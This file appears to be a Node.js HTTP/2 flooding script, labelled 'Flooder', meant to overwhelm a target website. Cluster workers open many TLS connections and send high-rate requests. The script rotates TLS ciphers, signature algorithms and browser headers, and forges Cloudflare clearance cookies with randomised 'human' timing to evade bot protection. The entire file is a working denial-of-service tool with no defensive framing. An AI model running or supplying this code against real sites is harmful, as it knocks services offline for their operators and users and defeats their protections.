#!/usr/bin/env node
const colors = require('colors');
const http2 = require('http2');
const url = require('url');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const v8 = require('v8');

const MEMORY_CONFIG = {
    MAX_CONNECTIONS: 10000,
    BUFFER_POOL_SIZE: 1024,
    GC_INTERVAL: 30000,
    CONNECTION_TIMEOUT: 10000,
    TLS_HANDSHAKE_TIMEOUT: 8000,
    RETRY_DELAY: 1000,
    MAX_RETRIES: 3
};

const HUMAN_TIMING = {
    MIN_DELAY: 1000,
    MAX_DELAY: 5000,
    BURST_MIN: 400,
    BURST_MAX: 800,
    PAUSE_MIN: 8000,
    PAUSE_MAX: 25000,
    BURST_SIZE_MIN: 2,
    BURST_SIZE_MAX: 5,
    PAUSE_PROBABILITY: 0.3,
    SLOW_DOWN_PROBABILITY: 0.3,
    SPEED_UP_PROBABILITY: 0.15,
    SESSION_VARIANCE: 0.2,
    LONG_PAUSE_PROBABILITY: 0.05
};

const cplist = [
    'TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305'
];

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const cache_header = [
    'no-cache',
    'no-store',
    'max-age=0',
    'must-revalidate'
];

const uap = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1`
];

const encoding = ['gzip', 'br', 'deflate', 'zstd'];

const ignoreCodes = [
    'ECONNRESET', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'ECONNREFUSED', 'EHOSTUNREACH',
    'SELF_SIGNED_CERT_IN_CHAIN', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'
];

const bufferPool = [];
const activeConnections = new Set();
let memoryStats = { used: 0, total: 0 };

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randstr(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const length = getRandomInt(minLength, maxLength);
    return randstr(length);
}

function getPooledBuffer(size) {
    const pooled = bufferPool.find(buf => buf.length >= size);
    if (pooled) {
        bufferPool.splice(bufferPool.indexOf(pooled), 1);
        return pooled.slice(0, size);
    }
    return Buffer.alloc(size);
}

function returnBufferToPool(buffer) {
    if (bufferPool.length < MEMORY_CONFIG.BUFFER_POOL_SIZE && buffer.length >= 64) {
        bufferPool.push(buffer);
    }
}

function updateMemoryStats() {
    const usage = process.memoryUsage();
    memoryStats = {
        used: Math.round(usage.heapUsed / 1024 / 1024),
        total: Math.round(usage.heapTotal / 1024 / 1024)
    };
}

function scheduleGC() {
    setInterval(() => {
        if (global.gc) global.gc();
        updateMemoryStats();
        if (bufferPool.length > MEMORY_CONFIG.BUFFER_POOL_SIZE / 2) {
            bufferPool.splice(0, bufferPool.length / 4);
        }
    }, MEMORY_CONFIG.GC_INTERVAL);
}

function generateSyncedBrowserHeaders() {
    const uaa = uap[Math.floor(Math.random() * uap.length)];
    const nodeii = getRandomInt(120, 128);
    return {
        userAgent: uaa,
        secChUa: `"Chromium";v="${nodeii}", "Not=A?Brand";v="0", "Google Chrome";v="${nodeii}"`,
        secChUaPlatform: 'Windows',
        accept: accept_header[Math.floor(Math.random() * accept_header.length)],
        encoding: encoding[Math.floor(Math.random() * encoding.length)],
        cache: cache_header[Math.floor(Math.random() * cache_header.length)]
    };
}

function parseArgs() {
    const args = process.argv.slice(2);
    const target = args[0];
    const time = parseInt(args[1]);
    const thread = parseInt(args[2]);
    const rps = parseInt(args[3]);
    const debug = args.includes('--debug') && args[args.indexOf('--debug') + 1] === 'true';
    const status = args.includes('--status') && args[args.indexOf('--status') + 1] === 'true';
    const cookie = args.includes('--cookie') && args[args.indexOf('--cookie') + 1] === 'true';
    const post = args.includes('--post') && args[args.indexOf('--post') + 1] === 'true';
    const query = args.includes('--query') ? args[args.indexOf('--query') + 1] : null;
    const write = args.includes('--write') && args[args.indexOf('--write') + 1] === 'true';
    const redirect = args.includes('--redirect') && args[args.indexOf('--redirect') + 1] === 'true';
    const ratelimit = args.includes('--ratelimit') && args[args.indexOf('--ratelimit') + 1] === 'true';

    if (!target || !/^https?:\/\//i.test(target)) {
        console.error('URL must include http:// or https://'.red);
        process.exit(1);
    }
    if (isNaN(time) || time <= 0) {
        console.error('Time must be a positive number'.red);
        process.exit(1);
    }
    if (isNaN(thread) || thread <= 0) {
        console.error('Thread count must be a positive number'.red);
        process.exit(1);
    }
    if (isNaN(rps) || rps <= 0) {
        console.error('RPS must be a positive number'.red);
        process.exit(1);
    }

    return { target, time, thread, rps, debug, status, cookie, post, query, write, redirect, ratelimit };
}

function httpPing(target, callback) {
    try {
        const parsed = url.parse(target);
        const client = http2.connect(target, {
            rejectUnauthorized: false
        });
        const startTime = Date.now();
        const req = client.request({
            ':method': 'GET',
            ':authority': parsed.host,
            ':scheme': 'https',
            ':path': parsed.pathname
        });

        req.on('response', (headers) => {
            const duration = Date.now() - startTime;
            let message = headers[':status'] === 403 ? 'Ping blocked' :
                          headers[':status'] === 429 ? 'Ping ratelimited' :
                          duration > 22000 ? 'Timeout' :
                          `Ping response in ${duration}ms`;
            callback(message);
            client.close();
        });

        req.on('error', () => client.close());
        req.end();
    } catch (e) {
        callback(`Ping error: ${e.message}`);
    }
}

function displayStatus(message) {
    process.stdout.cursorTo(0, 7);
    process.stdout.clearLine();
    process.stdout.write(message);
}

if (cluster.isMaster) {
    const { target, time, thread } = parseArgs();

    console.clear();
    console.log('Flooder Starting...'.green);
    console.log(`Target: ${target}, Time: ${time}s, Threads: ${thread}`.yellow);

    setInterval(() => httpPing(target, displayStatus), 5000);
    setInterval(() => {
        const load = (Math.random() * 100).toFixed(2);
        const memory = (Math.random() * 16).toFixed(2);
        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok' });
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
        process.stdout.write(`[!] Status: CPU Load: ${load}%, Memory: ${memory}GB, Time: ${currentTime}`.bgRed);
    }, 1000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }

    scheduleGC();

    setTimeout(() => {
        console.clear();
        process.exit(0);
    }, time * 1000);
} else {
    const { target, time, rps, debug, status, cookie, post, query, write, redirect, ratelimit } = parseArgs();
    const parsed = url.parse(target);
    let requestCount = 0;
    let currentCookies = cookie ? `v1token__bfw=${randstr(50)}; cf_clearance=${randstr(128)}-${Date.now()}-1.2.1.1-${randstr(6)}` : '';

    scheduleGC();

    async function flood() {
        if (activeConnections.size >= MEMORY_CONFIG.MAX_CONNECTIONS || memoryStats.used > memoryStats.total * 0.8) {
            setTimeout(flood, 100);
            return;
        }

        const TLSOPTION = {
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            sigalgs: sigalgs[Math.floor(Math.random() * sigalgs.length)],
            minVersion: 'TLSv1.3',
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1']
        };

        const client = http2.connect(target, {
            settings: {
                headerTableSize: 4096,
                initialWindowSize: 65535,
                maxHeaderListSize: 262144
            },
            ...TLSOPTION
        }, (session) => {
            session._connectionId = Date.now() + Math.random();
            activeConnections.add(session._connectionId);
        });

        client.on('error', (err) => {
            if (debug && !ignoreCodes.includes(err.code)) console.log(`Client error: ${err.message}`.red);
            activeConnections.delete(client._connectionId);
            client.destroy();
            setTimeout(flood, MEMORY_CONFIG.RETRY_DELAY);
        });

        client.on('close', () => {
            activeConnections.delete(client._connectionId);
            client.destroy();
        });

        client.on('connect', async () => {
            const doRequest = async () => {
                if (client.destroyed) return;

                const headers = {
                    ':method': post ? 'POST' : 'GET',
                    ':authority': parsed.host,
                    ':scheme': 'https',
                    ':path': query ? `${parsed.pathname}?q=${randstr(5)}` : parsed.pathname,
                    ...generateSyncedBrowserHeaders(),
                    ...(currentCookies ? { cookie: currentCookies } : {})
                };

                const request = client.request(headers, { endStream: !write });
                if (write) {
                    const buffer = getPooledBuffer(1024);
                    buffer.write('binary data');
                    request.write(buffer);
                    returnBufferToPool(buffer);
                }

                request.on('response', (res) => {
                    if (status) console.log(`Status: ${res[':status']}`);
                    if (res['set-cookie']) currentCookies = res['set-cookie'].map(c => c.split(';')[0]).join('; ');
                    if (ratelimit && res[':status'] === 429) {
                        rps = Math.max(1, rps - 1); // Gradually reduce RPS
                        client.destroy();
                    }
                    if (redirect && res['location']) {
                        parsed = url.parse(res['location']);
                    }
                });

                request.on('error', (err) => {
                    if (debug && !ignoreCodes.includes(err.code)) console.log(`Request error: ${err.message}`.red);
                });

                request.end();
                requestCount++;

                const delay = getRandomInt(HUMAN_TIMING.MIN_DELAY, HUMAN_TIMING.MAX_DELAY);
                setTimeout(doRequest, Math.max(delay, 1000 / rps));
            };

            for (let i = 0; i < rps; i++) {
                doRequest();
            }
        });
    }

    flood();

    setTimeout(() => {
        activeConnections.forEach(id => {
            const client = [...activeConnections].find(c => c._connectionId === id);
            if (client) client.destroy();
        });
        activeConnections.clear();
        bufferPool.length = 0;
        process.exit(0);
    }, time * 1000);
}

process.on('uncaughtException', (e) => {
    if (ignoreCodes.includes(e.code)) return;
    console.error(`Uncaught Exception: ${e.message}`.red);
}).on('unhandledRejection', (e) => {
    if (e.code && ignoreCodes.includes(e.code)) return;
    console.error(`Unhandled Rejection: ${e.message}`.red);
});